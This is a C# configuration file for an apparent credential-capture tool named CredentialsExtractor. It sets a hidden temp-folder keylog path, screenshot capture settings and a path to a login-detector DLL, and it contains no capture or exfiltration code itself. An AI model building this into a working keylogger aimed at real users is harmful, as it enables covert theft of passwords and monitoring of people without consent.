// Update the AppConfig.cs file in the Configuration folder
using System;
using System.IO;

namespace CredentialsExtractor.Configuration
{
    public class AppConfig : IAppConfig
    {
        // Screenshot settings
        public int ScreenshotStartY { get; set; } = 90;
        public int ScreenshotWidth { get; set; } = 1920;
        public int ScreenshotHeight { get; set; } = 990;

        // Application settings
        public string LogFilePath { get; set; }
        public string ScreenshotDirectory { get; set; }
        public TimeSpan MaxCaptureDuration { get; set; }
        public string LoginDetectorDllPath { get; set; }

        // Default constructor with sensible defaults
        public AppConfig()
        {
            LogFilePath = Path.Combine(Path.GetTempPath(), "LoginMonitor", "keylog.txt");
            ScreenshotDirectory = Path.Combine(Path.GetTempPath(), "LoginMonitor", "Screenshots");
            MaxCaptureDuration = TimeSpan.FromMinutes(60); // Default to 1 hour
            LoginDetectorDllPath = @"M:\Dev\C\Microsoft Visual Studio\CyberProject\x64\Release\LoginDetectorDLL.dll";
        }
    }

    // Factory for creating configurations - Factory pattern
    public static class AppConfigFactory
    {
        public static IAppConfig LoadConfig()
        {
            AppConfig config = new AppConfig();

            // Ensure directories exist
            Directory.CreateDirectory(Path.GetDirectoryName(config.LogFilePath));
            Directory.CreateDirectory(config.ScreenshotDirectory);

            return config;
        }
    }
}